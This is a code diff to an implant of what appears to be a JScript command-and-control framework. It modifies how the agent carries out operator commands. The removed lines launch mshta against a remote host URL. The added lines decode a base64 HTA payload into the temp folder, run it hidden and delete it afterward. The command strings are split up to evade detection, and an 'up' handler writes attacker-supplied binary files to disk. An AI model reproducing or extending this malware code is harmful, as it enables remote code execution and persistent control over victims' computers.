@@ -156,17 +156,27 @@ function main()
 
     if(jsObject.cmnd)
     {
-		var rettype = "retval"
-	    //kill
-	    if(jsObject.cmnd == "quit") {
-              retval = "[*] Shutting down..."
-              quit()
-	    }
+      var rettype = "retval"
+      //kill
+      if(jsObject.cmnd == "quit") {
+        retval = "[*] Shutting down..."
+        quit()
+      }
 
-	    else if(jsObject.cmnd == "spawn") {
-        runner.Run(cs +" /q /c "+"sta"+"rt /b msh"  + "ta "+proto+ho+me+":"+p0rt+"/"+id+"/r/b.hta", 0, true)
-		    retval = "[+] Spawn success..."
-	    }
+      else if(jsObject.cmnd.split(" ")[0] == "spawn") {
+        try {
+          fd = fso.CreateTextFile(temp + "\\" + id + ".hta")
+          fd.WriteLine(b64d(jsObject.cmnd.split(" ")[1]))
+          fd.close()
+          runner.Run(temp + "\\" + id + ".hta", 0, false)
+          runner.Run(cs +" /q /c " + "tim" + "eout " + "/t " + "1", 0, true)
+          fso.DeleteFile(temp + "\\" + id + ".hta")
+          retval = "[+] Spawn success..."
+        }
+        catch (e) {
+          retval = "[-] Spawn failed..."
+        }
+      }
 
       else if((jsObject.cmnd.split(" ")[0] == "psh") || (jsObject.cmnd.split(" ")[0] == "cs")) {
         fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
@@ -203,7 +213,7 @@ function main()
 	  }
 
                 else if(jsObject.cmnd.split(" ")[0] == "up") {
-                  try {
+                  //try {
                     var array = jsObject.cmnd.split(" ")
                     content = b64d(array[1], "bin")
                     array.shift()
@@ -211,10 +221,10 @@ function main()
                     filename = array.join(" ")
                     writebinfile(filename, content)
                     retval = "[*] File uploaded: " + filename
-                  }
-                  catch (e) {
-                    retval = "[-] Could not upload file: " + filename
-                  }
+                  //}
+                  //catch (e) {
+                  //  retval = "[-] Could not upload file: " + filename
+                  //}
                 }
 
 	    //credit to nate and 0sum
